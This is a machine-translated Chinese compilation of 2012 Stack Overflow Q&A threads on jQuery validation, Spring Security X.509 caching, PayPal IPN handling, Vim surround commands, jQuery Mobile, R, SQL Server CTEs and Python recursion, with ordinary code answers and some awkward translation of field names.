  submitHandler: function(form, event) { 
    event.preventDefault();
    alert("Do some stuff...");
    //submit via ajax
  }
}); 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-04-24T21:05:19.593

有一个名为 .valid() 的方法在表单中没有错误的情况下返回 true，因此您可以先使用它进行验证，然后将表单发送到此处的文档

[http://docs.jquery.com/Plugins/Validation/valid](http://docs.jquery.com/Plugins/Validation/valid)

# spring - Spring Security 使用 X.509 认证并定期更新授权 UserDetails

> ID：10305939
> 
> 赞同：4
> 
> 时间：2012-04-24T21:02:12.367
> 
> 标签：spring, spring-security, authorization, cxf, x509

我使用 Spring 和 Apache CXF 创建了一个 REST Web 服务应用程序。我使用 x.509 证书对用户进行身份验证，然后使用自定义授权服务来获取所有用户组和详细信息。我已经实现了一个自定义*UserDetailsS​​ervice*来提取用户信息并填充一个*UserDetails*对象。填充此对象的部分过程涉及对公司授权服务的请求。不幸的是，授权服务是一个专有系统，但至少它们提供了 Java API。除其他外，授权服务会返回用户所属的组列表。

我仍处于开发阶段，但到目前为止我的观察似乎表明*UserDetailsS​​ervice*在初始连接时被调用一次。然后每个请求使用一个缓存的授权对象。

所以我的问题和潜在问题是……公司政策规定，应用程序只允许在一段时间内缓存用户授权详细信息。那么，Spring 会在刷新之前将这些*UserDetails对象缓存多久呢？*而且，我怎样才能控制这个缓存时间以确保我遵守政策？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T01:48:47.197

提交了一张与此请求类似的票：

*   [https://jira.springsource.org/browse/SEC-898](https://jira.springsource.org/browse/SEC-898)

票证中的建议是创建自己的过滤器，而不是定期将 Authentication.setAuthenticated 属性设置为 false，从而强制查找用户。您可以通过设置较小的会话超时来实现相同的目的

# paypal - 如何通过 IPN 使用 Paypal 自适应支付？

> ID：10305942
> 
> 赞同：5
> 
> 时间：2012-04-24T21:02:22.840
> 
> 标签：paypal, paypal-ipn, paypal-adaptive-payments

我正在使用 Paypal 的自适应支付系统。使用沙盒帐户，我能够发出 PayRequest 并被转发到 Paypal 进行付款。然后它看起来像：

**请求**=

2012 年 4 月 24 日晚上 10:35:46 com.paypal.adaptive.api.requests.PayRequest 执行信息：发送 PayRequest 与：**requestEnvelope.errorLanguage** =en_US& **actionType** =PAY& **receiverList.receiver(0).email** =seller_1334320690_biz%40email.org& **receiverList.receiver(0).amount** =5.0& **currencyCode** =EUR& **feePayer** =SENDER& **cancelUrl** =https%3A%2F%2Flocalhost%3A8443& **returnUrl** =http%3A%2F%2Flocalhost%2F& **ipnNotificationUrl** =http%3A%2F%2Flocalhostu%2Ffinishdeposit&

**回应**=

2012 年 4 月 24 日晚上 10:35:48 com.paypal.adaptive.api.requests.PayPalBaseRequest makeRequest INFO：收到响应：**responseEnvelope.timestamp** =2012-04-24T13%3A35%3A48.587-07%3A00& **responseEnvelope.ack** =成功& **responseEnvelope.correlationId** =c8dee8023cca6& **responseEnvelope.build** =2756816& **payKey** =AP-1UF57245CJ360523K&paymentExecStatus=CREATED

我现在想弄清楚，我该如何检查，付款是否成功完成。所以我尝试实现 ipn 系统，它使用沙盒工具工作。但是，我不知道如何将 2 连接在一起。即，当付款时，我假设我需要在数据库中创建该用户已付款的记录，可能是挂起/创建的？然后等待ipn返回通知我支付成功，更新数据库表说完成？我如何将 PayRequest 与 IPN 通知相关联，我将从贝宝获得？Paypal 仅使用 IPN 通知发送一些信息，例如：

*   item_number=AK-1234
*   居住国=美国
*   verify_sign=ArcmaOINNZx08uC3iQY0zhEQN3IZAz70ynRk93Or8ixRi23bb4rGNIrd
*   address_country=美国
*   address_city=圣何塞
*   address_status=未确认
*   payment_status=已完成
*   业务=seller@paypalsandbox.com
*   payer_id=TESTBUYERID01
*   名字=约翰
*   运费=3.04
*   payer_email=buyer@paypalsandbox.com
*   mc_fee=0.44
*   txn_id=484221854
*   数量=1
*   receiver_email=seller@paypalsandbox.com
*   通知版本=2.1
*   txn_type=web_accept
*   test_ipn=1
*   付款人状态=已验证
*   mc_currency=美元
*   mc_gross=12.34
*   自定义=xyz123
*   mc_gross_1=9.34
*   payment_date=11:54:48 2012 年 4 月 22 日 PDT
*   字符集=windows-1252
*   address_country_code=美国
*   地址_zip=95131
*   地址状态=CA
*   税=2.02
*   item_name=某事
*   address_name=约翰·史密斯
*   姓氏=史密斯
*   付款类型=即时
*   address_street=123, 任意街道
*   receiver_id=TESTSELLERID1

我在那个 IPN 通知中找不到可用的东西。最好的情况是，如果我能获得与我已经通过付费响应获得的 IPN 通知相同的相关 ID。所以我可以将 response-correlation-id 保存在我的数据库中，然后检查它是否收到具有相同相关 id 的 IPN 通知。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-24T19:03:24.457

他们在沙盒中给你的测试IPN很糟糕。查看触发到您的实际回调（甚至是测试）的真实事件，您会看到它定义了 payKey；这是你用来查找它的。

请注意，IPN 回调需要端口 80（尽管在任何地方都没有记录）。

这是一个真实的 IPN 通知（转换为 JSON，特定于我的应用程序的信息已编辑）：

```
{"payment_request_date":"Sun Jun 24 06:12:20 PDT 2012",
"return_url":"http://redacted/paypal/transactions/3?status=completed",
"fees_payer":"EACHRECEIVER",
"ipn_notification_url":"http://redacted/paypal/notifications",
"sender_email":"redacted",
"verify_sign":"AFcWxVredacted",
"test_ipn":"1",
"transaction[0].id_for_sender_txn":"redacted",
"transaction[0].receiver":"redacted",
"cancel_url":"http://redacted/paypal/transactions/3?status=canceled",
"transaction[0].is_primary_receiver":"false",
"pay_key":"AP-redacted",
"action_type":"PAY",
"transaction[0].id":"redacted",
"transaction[0].status":"Completed",
"transaction[0].paymentType":"SERVICE",
"transaction[0].status_for_sender_txn":"Completed",
"transaction[0].pending_reason":"NONE",
"transaction_type":"Adaptive Payment PAY",
"transaction[0].amount":"USD 1.00",
"status":"COMPLETED",
"log_default_shipping_address_in_transaction":"false",
"charset":"windows-1252",
"notify_version":"UNVERSIONED",
"reverse_all_parallel_payments_on_error":"true"} 
```

请注意，您必须在 PAY 请求中手动设置 reverse_all_parallel_payments_on_error。即使他们建议这样做（它可能会为您节省焦虑），但默认情况下它是错误的。

此外，如果您错过了 IPN，您可以使用 PaymentDetails 直接获取所有相同的信息。

我不知道 @swade1987 在看什么，但我的 IPN 不包含有关费用金额的任何信息。（这实际上就是我找到这篇文章的方式；试图找出原因。PP API 文档很糟糕。）

可以在此处找到其他文档[https://developer.paypal.com/docs/classic/adaptive-payments/integration-guide/APIPN/](https://developer.paypal.com/docs/classic/adaptive-payments/integration-guide/APIPN/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-11-20T09:51:42.960

有点晚了，但对于从搜索引擎撞到这里的人来说......

我最近才开始自己处理 Paypal API。OP 引用的 IPN 消息是通过卖家资料中定义的 IPN 通知 URL 传递的消息。相比之下，@sai 引用的 IPN 是自适应支付 IPN，传递到 Pay、ExecutePaypement 或 Preapproval API 请求中定义的 ipnNotificationUrl。

它们是两种不同类型的 IPN 消息并已[记录在案](https://developer.paypal.com/docs/classic/ipn/integration-guide/IPNandPDTVariables/#id0991G0M005Z)，请查找支付信息变量和支付/预批准消息变量。如果您同时选择这两种类型的 IPN，则可以获得这两种类型的 IPN。

对于 OP 引用的 IPN 消息，可以使用 txn_id 字段的值通过 transactionId 获取 PaymentDetails。transationId 与 payKey 一样可以引用已完成的付款。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-27T13:47:18.423

这应该对你有很大帮助。

```
namespace Gateway
{
    public class MerchantSellerIPNService : IMerchantSellerIPNService
    {
        /// <summary>
        /// This is the method which is hit when using the URL in the PAY request to PayPal.
        /// </summary>
        /// <param name="stream"></param>
        /// <returns></returns>
        public string ProcessIPN(Stream stream)
        {
            // Declare locally used variables.
            byte[] requestArray = null;
            string requestString = null;
            string responseString = null;
            StreamReader IPNReturnReader;
            StreamWriter streamWriter;
            MemoryStream responseStream = new MemoryStream();
            HttpWebRequest payPalRequest;
            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();

            // Get the URL to send the IPN received back to PayPal (use either of the two below depending on the environment.)
            <add key="PAYPAL_IPN_URL" value="https://www.sandbox.paypal.com/cgi-bin/webscr" />
            <add key="PAYPAL_IPN_URL" value="https://www.paypal.com/cgi-bin/webscr"/>

            string IPNReturnURL = ConfigurationManager.AppSettings["PAYPAL_IPN_URL"];

            // Read in the data provided from PayPal
            StreamReader streamReader = new StreamReader(stream);

            // Obtain the email address and pre-approval key passed to use via PayPal for later use.
            string strPayPalMessage = streamReader.ReadToEnd();

            // Initalize the POST web request we are going to send to PayPal to valid the IPN we received from them.
            payPalRequest = (HttpWebRequest)WebRequest.Create(IPNReturnURL);
            payPalRequest.Method = "POST";
            payPalRequest.ContentType = "application/x-www-form-urlencoded";

            // Create an array containing the IPN message PayPal sent to us.
            requestArray = encoding.GetBytes(strPayPalMessage);

            // Then add the necessary string to the back to use for verfication.
            requestString = Encoding.ASCII.GetString(requestArray);
            requestString += "&cmd=_notify-validate";
            payPalRequest.ContentLength = requestString.Length;

            // Now write the updated IPN message back to PayPal for verification.
            streamWriter = new StreamWriter(payPalRequest.GetRequestStream(), System.Text.Encoding.ASCII);
            streamWriter.Write(requestString);
            streamWriter.Close();

            // Read the response from PayPal and process it.
            IPNReturnReader = new StreamReader(payPalRequest.GetResponse().GetResponseStream());
            responseString = IPNReturnReader.ReadToEnd();
            IPNReturnReader.Close();

            if (responseString == "VERIFIED")
            {
                try
                {
                    if (strPayPalMessage.Contains("payment_status=Completed"))
                    {
                        if (ProcessPaymentIPNMessage(strPayPalMessage))
                            PayPalInStore.Utils.ErrorHandler.LogError(new Exception("ProcessPaymentIPNMessage - Able to create new payment Transaction Detail Record"), "DEBUG");
                        else
                            PayPalInStore.Utils.ErrorHandler.LogError(new Exception("ProcessPaymentIPNMessage - Unable to create new payment Transaction Detail Record"), "DEBUG");
                    }
                    else if (strPayPalMessage.Contains("payment_status=Refunded"))
                    {
                        if (ProcessRefundIPNMessage(strPayPalMessage))
                            PayPalInStore.Utils.ErrorHandler.LogError(new Exception("ProcessRefundIPNMessage - Able to create new refund Transaction Detail Record"), "DEBUG");
                        else
                            PayPalInStore.Utils.ErrorHandler.LogError(new Exception("ProcessRefundIPNMessage - Unable to create new refund Transaction Detail Record"), "DEBUG");
                    }
                    else
                    {
                        PayPalInStore.Utils.ErrorHandler.LogError(new Exception("MerchantSellerIPNService - ProcessIPN - Unknown message type"), "DEBUG");
                    }
                }
                catch (Exception ex)
                {
                    PayPalInStore.Utils.ErrorHandler.LogError(new Exception("MerchantSellerIPNService - ProcessIPN failed"), "DEBUG");
                }
            }
            else if (responseString == "INVALID")
            {
                PayPalInStore.Utils.ErrorHandler.LogError(new Exception("MerchantSellerIPNService - Invalid IPN Message Received: "), "DEBUG");
            }
            else
            {
                PayPalInStore.Utils.ErrorHandler.LogError(new Exception("MerchantSellerIPNService - Fatal IPN Message Received: "), "DEBUG");
            }

            return "MerchantSellerIPNService Completed";
        }

        /// <summary>
        /// Method used to process the Payment IPN notification message and update the database as required.
        /// </summary>
        /// <returns></returns>
        private bool ProcessPaymentIPNMessage(string PayPalIPNMessage)
        {
            // Firstly, we need to split the IPN message into sections based on the & sign.
            string[] PayPalMessageElemetsArray = PayPalIPNMessage.Split('&');

            // Now obtain the list of information (from the message) we require to make the TransactionDetail record.
            string merchantTransactionId = Array.Find(PayPalMessageElemetsArray, element => element.StartsWith("txn_id=", StringComparison.Ordinal));
            string feeAmount = Array.Find(PayPalMessageElemetsArray, element => element.StartsWith("mc_fee=", StringComparison.Ordinal));
            string grossAmount = Array.Find(PayPalMessageElemetsArray, element => element.StartsWith("mc_gross=", StringComparison.Ordinal));

            // TODO: REMOVE THIS ITS FOR DEBUGGING PURPOSES
            string errorMessage2 = String.Format("ProcessPaymentIPNMessage - merchantTransactionId: {0}, feeAmount: {1}, grossAmount: {2}", merchantTransactionId, feeAmount, grossAmount);
            PayPalInStore.Utils.ErrorHandler.LogError(new Exception(errorMessage2), "DEBUG");

            try
            {
                // We now need to remove the variable name and '=' from the elements so we only have the necessary information.
                merchantTransactionId = merchantTransactionId.Replace("txn_id=", "");
                feeAmount = feeAmount.Replace("mc_fee=", "");
                grossAmount = grossAmount.Replace("mc_gross=", "");

                // Now convert the values obtained from the IPN message and calculate the net amount.
                decimal dFeeAmount = Convert.ToDecimal(feeAmount);
                decimal dGrossAmount = Convert.ToDecimal(grossAmount);
                decimal dNetAmount = Math.Round((dGrossAmount - dFeeAmount), 2);

                try
                {
                    // Finally create the new transaction fee record.
                    TransactionDetail transactionDetail = new TransactionDetail();
                    transactionDetail.MerchantTransactionId = merchantTransactionId;
                    transactionDetail.Gross = dGrossAmount;
                    transactionDetail.Fee = Decimal.Negate(dFeeAmount);
                    transactionDetail.Net = dNetAmount;
                    transactionDetail.TransactionType = (int)TransactionDetailTransactionType.InStorePayment;
                    transactionDetail.Save();
                }
                catch (Exception ex)
                {
                    string errorMessage = String.Format("ProcessPaymentIPNMessage - Unable to create new TransactionDetail record for Merchant Transaction ID: {0}", merchantTransactionId);
                    PayPalInStore.Utils.ErrorHandler.LogError(new Exception(errorMessage), "DEBUG");
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                string errorMessage = String.Format("ProcessPaymentIPNMessage - Unable to create new TransactionDetail record for Merchant Transaction ID: {0}", merchantTransactionId);
                PayPalInStore.Utils.ErrorHandler.LogError(new Exception(errorMessage), "DEBUG");
                return false;
            }
        }

        /// <summary>
        /// Method used to process the Refund IPN notification message and update the database as required.
        /// </summary>
        /// <returns></returns>
        private bool ProcessRefundIPNMessage(string PayPalIPNMessage)
        {
            // Firstly, we need to split the IPN message into sections based on the & sign.
            string[] PayPalMessageElemetsArray = PayPalIPNMessage.Split('&');

            // Now obtain the list of information (from the message) we require to make the TransactionDetail record.
            string merchantTransactionId = Array.Find(PayPalMessageElemetsArray, element => element.StartsWith("txn_id=", StringComparison.Ordinal));
            string parentTransactionId = Array.Find(PayPalMessageElemetsArray, element => element.StartsWith("parent_txn_id=", StringComparison.Ordinal));
            string feeAmount = Array.Find(PayPalMessageElemetsArray, element => element.StartsWith("mc_fee=", StringComparison.Ordinal));
            string grossAmount = Array.Find(PayPalMessageElemetsArray, element => element.StartsWith("mc_gross=", StringComparison.Ordinal));

            try
            {
                // We now need to remove the variable name and '=' from the elements so we only have the necessary information.
                merchantTransactionId = merchantTransactionId.Replace("txn_id=", "");
                parentTransactionId = parentTransactionId.Replace("parent_txn_id=", "");
                feeAmount = feeAmount.Replace("mc_fee=", "").Replace("-", "");
                grossAmount = grossAmount.Replace("mc_gross=", "").Replace("-", "");

                // Now convert the values obtained from the IPN message and calculate the net amount.
                decimal dFeeAmount = Convert.ToDecimal(feeAmount);
                decimal dGrossAmount = Convert.ToDecimal(grossAmount);
                decimal dNetAmount = Math.Round((dGrossAmount - dFeeAmount), 2);

                // Now create the new transaction fee record.
                try
                {
                    // Finally create the new transaction fee record.
                    TransactionDetail transactionDetail = new TransactionDetail();
                    transactionDetail.MerchantTransactionId = merchantTransactionId;
                    transactionDetail.Gross = dGrossAmount;
                    transactionDetail.Fee = Decimal.Negate(dFeeAmount);
                    transactionDetail.Net = dNetAmount;
                    transactionDetail.TransactionType = (int)TransactionDetailTransactionType.InStoreRefund;
                    transactionDetail.Save();
                }
                catch (Exception ex)
                {
                    string errorMessage = String.Format("ProcessPaymentIPNMessage - Unable to create new TransactionDetail record for Merchant Transaction ID: {0}", merchantTransactionId);
                    PayPalInStore.Utils.ErrorHandler.LogError(new Exception(errorMessage), "DEBUG");
                    return false;
                }

                // Finally update the PurchaseRefund record with the Parent Transaction Id (used as a backup incase the API IPN message for the payment wasn't received).
                try
                {
                    PurchaseRefund refund = PurchaseRefund.SingleOrDefault(x => x.RefundTransactionId == merchantTransactionId);
                    if (refund != null)
                    {
                        refund.ParentTransactionId = parentTransactionId;
                        refund.Save();
                    }
                }
                catch (Exception ex)
                {
                    string errorMessage = String.Format("ProcessPaymentIPNMessage - Unable to update PurchaseRefund record (Transaction ID: {0}) with Parent Transaction Id: {1}", merchantTransactionId, parentTransactionId);
                    PayPalInStore.Utils.ErrorHandler.LogError(new Exception(errorMessage), "DEBUG");
                    return false;
                }

                // If all is succesful we can return true.
                return true;
            }
            catch (Exception ex)
            {
                string errorMessage = String.Format("ProcessPaymentIPNMessage - Unable to create new TransactionDetail record for Merchant Transaction ID: {0}", merchantTransactionId);
                PayPalInStore.Utils.ErrorHandler.LogError(new Exception(errorMessage), "DEBUG");
                return false;
            }
        }
    }
} 
```

# session - 以编程方式跟踪意外的会话超时

> ID：10305951
> 
> 赞同：1
> 
> 时间：2012-04-24T21:03:05.867
> 
> 标签：session, web, tracking

目前我已经在 SessionListener.java 类中实现了 HttpSessionListener 接口，其中每次用户会话结束时都会调用 sessionDestroyed 方法。我已将日志语句放在 sessionDestroyed 方法中。但它并没有真正区分用户注销操作和服务器会话超时。

我有另一个注销操作（spring mvc 控制器），每当用户单击注销按钮并清除会话时都会调用它。

现在我想区分用户注销和服务器会话超时，并将其相应地记录在 SessionListener.java 类的 sessionDestroyed 方法中。

有了这个，我想实际跟踪是否有任何服务器会话超时，甚至在达到实际超时期限之前。

# vim - Vim：在标签中包含单词

> ID：10305952
> 
> 赞同：11
> 
> 时间：2012-04-24T21:03:08.967
> 
> 标签：vim

我想在 Vim 中用封闭标签包装一个单词，例如 from `word`to`'word'`或 from `word`to `(word)`。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-04-24T21:11:49.290

使用 Tim Pope 的[vim-surround](https://github.com/tpope/vim-surround)，可以使用:`ysw'`用“`”`ysw(`包围单词，用“(”包围单词。如果你想用 HTML 标签等实际标签包围单词`<code>`，可以使用`yswt`,然后在提示中输入您的标签。如果您想更改现有的环绕元素，请使用`csw`，输入您要替换的环绕元素并点击`<CR> (enter)`，然后输入新的环绕元素。

请注意，要使上述命令起作用，您必须将光标放在要包围的单词的开头。

从其官方页面：

> 按`cs"'`（即c、s、双引号、单引号）里面
> 
> “你好世界！”
> 
> 将其更改为
> 
> '你好世界！'
> 
> 现在按`cs'<q>`将其更改为
> 
> 你好世界！
> 
> 要转一圈，请按`cat"`获取
> 
> “你好世界！”
> 
> 要完全删除分隔符，请按`ds"`。
> 
> 你好世界！
> 
> 现在将光标放在“Hello”上，按`ysiw]`(`iw`是一个文本对象)。
> 
> [你好世界！
> 
> 让我们制作大括号并添加一些空格（使用“}”而不是“{”表示没有空格）：`cs]{`
> 
> { 你好世界！
> 
> `yssb`现在用or将整行括在括号中`yes)`。
> 
> （{ 你好世界！）
> 
> 还原为原文：`ds{ds)`
> 
> 你好世界！
> 
> 强调你好：`ysiw<em>`
> 
> *你好*世界！
> 
> 最后，让我们试试视觉模式。按大写`V`字母（用于线性视觉模式），然后按`S<p class="important">`。
> 
> *你好*世界！

有关更详细的使用信息，请安装`vim-surround`，然后使用`:help surround`来调用文档。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-24T21:07:18.450

看看 Tim Pope 的[round.vim](http://www.vim.org/scripts/script.php?script_id=1697)。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-24T22:18:15.047

`<c-r>`对于这些来说非常方便，可以让您插入寄存器、剪贴板、光标下的单词 ( `<c-r><c-a>`) 等的内容。例如：

```
nmap <space>' ciw'<c-r>"'<esc>
vmap <space>' c'<c-r>"'<esc>
nmap <space>( ciw(<c-r>")<esc>
vmap <space>( c(<c-r>")<esc> 
```

映射`space+'`以将当前单词或视觉选择包含在单引号中，或者`space+(`将当前单词或视觉选择包含在双引号中。

映射的内容是“改变内词|选中文本，插入引号，插入单词，插入引号，退出插入模式”。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-08-19T22:19:44.587

我第一次使用这个片段将宏记录到字母 M 中： qmcw'<cr>" '<esc>q 然后用@m 重做

解释，首先需要 10 次打击：

*   qm 开始记录字母 m 中的宏
*   cw 只更改一个单词并让您进入插入模式
*   ' 写第一个引号
*   <cr>" 粘贴我们在 stade 2 删除的单词，同时保持插入模式
*   ' 是另一个周围的报价
*   <esc> 返回编辑字
*   q 结束宏。

用@m 回忆一下：现在我们只使用两个罢工来包围......

# jquery - 如何填写 在 jquery 手机中

> ID：10305955
> 
> 赞同：0
> 
> 时间：2012-04-24T21:03:23.527
> 
> 标签：jquery, css, jquery-mobile

我有一个`<ul>`with data-role="listview" 属性。对于`<li>`元素，我希望在 中包含一个`<div>`，`<li>`覆盖 中的主要内容`<li>`，当一个人向右滑动时，`<div>`动画向右滑动，显示 div 下方的内容。

我的问题是，当我将 div 添加到`<li>`元素时，我无法`<div>`覆盖`<li>`元素。即使我设置了样式`style: height=100%`，div 似乎也只占用了大约 2/3 的`<li>`元素空间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T21:39:16.250

您可以将 DIV 元素添加到列表项，如下所示：

HTML --

```
 <ul data-role="listview">
        <li data-icon="grid"><a href="#">This is normal content.</a><div class="cover-div">Swipe to Uncover</div></li>
        <li data-icon="grid"><a href="#">This is normal content.</a><div class="cover-div">Swipe to Uncover</div></li>
        <li data-icon="grid"><a href="#">This is normal content.</a><div class="cover-div">Swipe to Uncover</div></li>
        <li data-icon="grid"><a href="#">This is normal content.</a><div class="cover-div">Swipe to Uncover</div></li>
        <li data-icon="grid"><a href="#">This is normal content.</a><div class="cover-div">Swipe to Uncover</div></li>
    </ul> 
```

这会在 jQuery Mobile 初始化列表视图后创建以下输出：

```
<li data-icon="grid" data-corners="false" data-shadow="false" data-iconshadow="true" data-wrapperels="div" data-iconpos="right" data-theme="c" class="ui-btn ui-btn-icon-right ui-li-has-arrow ui-li ui-btn-up-c">
    <div class="ui-btn-inner ui-li">
        <div class="ui-btn-text">
            <a href="#" class="ui-link-inherit">This is normal content.</a>
            <div class="cover-div">Swipe to Uncover</div>
        </div>
        <span class="ui-icon ui-icon-grid ui-icon-shadow">&nbsp;</span>
    </div>
</li> 
```

然后你可以为元素添加定位和背景样式：

CSS——

```
.cover-div {
    position   : absolute;
    top        : 0;
    left       : 0;
    width      : 100%;
    height     : 100%;
    z-index    : 2;
    background : #000;
    background : rgba(0, 0, 0, 0.7);
    color      : #fff;
}​ 
```

最后，您可以检测“封面”DIV 上的滑动事件并在屏幕外为元素设置动画：

JS——

```
//when a page is initialized by jQuery Mobile, we'll do our own initialization
$(document).delegate('[data-role="page"]', 'pageinit', function () {

    //find all the `.cover-div` elements on this page and bind to swipe left/right events for the elements
    $(this).find('.cover-div').bind('swipeleft swiperight', function (event) {

        //if the user swiped to the left then animate the DIV to the left
        if (event.type == 'swipeleft') {
            $(this).stop().animate({ left : '-100%' }, 250);

        //otherwise animate the DIV to the right
        } else {
            $(this).stop().animate({ left : '100%' }, 250);
        }
    });
});
​ 
```

这是一个演示：http: [//jsfiddle.net/pmqDf/1/](http://jsfiddle.net/pmqDf/1/)

# r - 在 r 中计数 -99.9

> ID：10305957
> 
> 赞同：1
> 
> 时间：2012-04-24T21:03:38.907
> 
> 标签：r

我是使用 R 的新手，我有一个问题正在尝试寻找答案。我有一个组织如下的文件（它有数千行，但为了简单起见，我只显示一个示例）：

```
YEAR   Month  day    S1      T1     T2         R1
1965    3       2    11.7    20.6    11.1    18.8
1965    3       3    14.0    16.7     3.3     0.0
1965    3       4   -99.9   -99.9   -99.9   -99.9
1965    3       5     9.2     5.6     0.0   -99.9
1965    3       6    10.1     6.7     0.0   -99.9
1965    3       7     9.7     7.2     1.1     0.0 
```

我想知道 -99.9 所在的年、月和日的每一列（T1、T2 和 R1）；例如，从 1980/1/3 到 1980/1/27，T1 有 X -99.9，从 1990/2/10 到 1990/3/30，T1 有 Y-99.9 ......等等。T2 和 R 也是如此。如何在 R 中做到这一点？

这只是一个这样的文件，但我有近 2000 个文件有同样的问题（我知道我需要循环它）但如果我知道如何为一个文件执行它，那么我将创建一个循环。

我真的很感激任何帮助。非常感谢您的阅读和帮助！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T01:30:27.560

如果我理解正确，您想按列获得每月获得多少个“-99.9”，

这是我的 S1 代码，使用`plyr`. 您会注意到，我扩展了您的示例以获得多一个月的数据。

```
library(plyr)

my.table <-read.table(text="YEAR Month day S1 T1 T2 R1
1965 3 2 11.7 20.6 11.1 18.8
1965 3 3 14.0 16.7 3.3 0.0
1965 3 4 -99.9 -99.9 -99.9 -99.9
1965 3 5 9.2 5.6 0.0 -99.9
1965 3 6 10.1 6.7 0.0 -99.9
1965 3 7 9.7 7.2 1.1 0.0
1966 1 7 -99.9 7.2 1.1 0.0
1966 1 8 -99.9 7.2 1.1 0.0
", header=TRUE, as.is=TRUE,sep = " ")

#Create a year/month column to summarise per month
my.table$yearmonth <-paste(my.table$YEAR,"/",my.table$Month,sep="")

S1 <-count(my.table[my.table$S1==-99.9,],"yearmonth")
S1
  yearmonth freq
1    1965/3    1
2    1966/1    2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:16:28.490

我冒昧地将您的最后一个数据框列重命名为“R1”

```
 lapply(c('T1', 'T2', 'R1'), function(x) { dfrm[ dfrm[[x]]==-99.9 , # rows to select
                                               1:3 ] }# columns to return
        )
#-------------    
[[1]]
  YEAR Month day
3 1965     3   4

[[2]]
  YEAR Month day
3 1965     3   4

[[3]]
  YEAR Month day
3 1965     3   4
4 1965     3   5
5 1965     3   6 
```

目前尚不清楚您是否想要值或计数（我认为您不能在同一个报告中同时拥有两者。）如果您想命名条目：

```
> misdates <- .Last.value
> names(misdates) <- c('T1', 'T2', 'R1') 
```

如果你想要一个计数：

```
 lapply(misdates, NROW)
$T1
[1] 1

$T2
[1] 1

$R1
[1] 3 
```

（您可能想了解如何使用 NA 值。不建议使用数字作为缺失值进行数据管理。）

# sql-server - 在 MS SQL 中使用递归 CTE 返回所有非叶节点

> ID：10305960
> 
> 赞同：0
> 
> 时间：2012-04-24T21:03:50.213
> 
> 标签：sql-server, sql-server-2005

我有一张数据表

```
id       name       mgtId
--------------------------
1        joe         null
2        jack         1
3        jill         1
4        paul         2
5        ron          4
6        sam          2 
```

mgtId 引用 id。如何使用 CTE 选择非叶节点（joe、jack、paul）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:11:18.140

```
select *
from table
where id in (select mgtId from table) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T21:12:53.127

单程：

```
;with parents_id as (
   select distinct mgtId as id
   from your_table
)
select *
from your_table t
inner join parants_id p on t.id = p.id 
```

**2012**年 4 月 25 日更新

我来[测试上面的查询](https://data.stackexchange.com/stackoverflow/query/67716/return-all-non-leaf-nodes-using-cte-in-ms-sql)，它可以工作并且还返回根节点：

```
select * 
into #your_table
from (
select 1 as id, 'joe' as name, null as mgtId union all
select 2,        'jack   ',      1  union all
select 3,        'jill  ' ,      1 union all
select 4,        'paul '  ,      2 union all
select 5,        'ron '   ,      4 union all
select 6,        'sam'    ,      2  ) T

;with parents_id as (
   select distinct mgtId as id
   from #your_table
)
select *
from #your_table t
inner join parents_id p on t.id = p.id 
```

结果：

```
id name    mgtId id 
-- ------- ----- -- 
1  joe     null  1  
2  jack    1     2  
4  paul    2     4 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-25T05:10:27.737

与 cte as( select id,mgtId from mgr_emp ) select b.id,b.name ,b.mgtId ,a.mgtId from cte a right join mgr_emp b on b.mgtId =a.id

# python - python - 如何在包含Python列表的列表上的递归函数中引用当前活动子列表？

> ID：10305962
> 
> 赞同：0
> 
> 时间：2012-04-24T21:04:00.467
> 
> 标签：python, parsing

我需要能够获取包含字符串的列表和嵌套的字符串列表，如下所示：

```
['parent', ['child', 'child2', ['grandchild', ['ggrandchild'], 'grandchild2'], 'child3'], '2parent', '3parent' ['3child', ['3grandchild']]] 
```

并为每个父、每个父子、每个父子孙等打印字符串：

```
'parent'
'parent_child'
'parent_child2'
'parent_child2_grandchild'
'parent_child2_grandchild_ggrandchild'
'parent_child2_grandchild2'
'parent_child3"
'2parent'
...
etc 
```

我已经能够使用以下代码使其工作到两个嵌套级别的深度：

```
def list_check(parsed_list):
    for item in parsed_list:

        if type(item) != list and prefix == []: 
            prefix.append(str(item))
            print item

        elif type(item) != list and prefix != []: 
            print prefix[0]+"-"+item

        elif type(item) == list:
            list_check(item)

        else:
            pass 
```

但我正在努力让它适用于任意嵌套深度。我采用了一种通过堆栈跟踪嵌套深度的基本方法，但是我的实现以一种明显的方式被破坏了，我不知道如何修复。

它当前删除堆栈中的内容，即使还有其他孩子跟随。如果子列表结束，我想要它做的只是从相关堆栈中弹出项目。

```
prefix = []
nesting_depth = []

def list_check(parsed_list):
    for item in parsed_list:

        if type(item) == list:

            nesting_depth.append('1')
            list_check(item)

        elif type(item) != list and prefix == []: 
            prefix.append(str(item))
            print item

        elif type(item) != list and prefix != []: #this where i need another condition like 'and item is last in current sublist'
            print prefix[0:len(nesting_depth)]+"-"+item
            prefix.pop()

        else:
            pass 
```

如何以适应整个函数递归的方式引用“如果它是 parsed_list 的当前子列表中的最后一项”之类的内容？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T22:12:07.477

字典会更适合您的需要。但是，您可以使用现有的数据结构执行以下操作：

```
def format_tree(tree):                                                                                            
    prefix = ''
    for node in tree:
        if isinstance(node, basestring):
            prefix = node
            yield node
        else:
            for elt in format_tree(node):
                yield prefix + '_' + elt 
```

一个简单的测试：

```
>>> a = ['parent', ['child', 'child2', ['grandchild', ['ggrandchild']], 'child3']]
>>> print '\n'.join(format_tree(a))
parent
parent_child
parent_child2
parent_child2_grandchild
parent_child2_grandchild_ggrandchild
parent_child3 
```

* * *

## 回答 #2

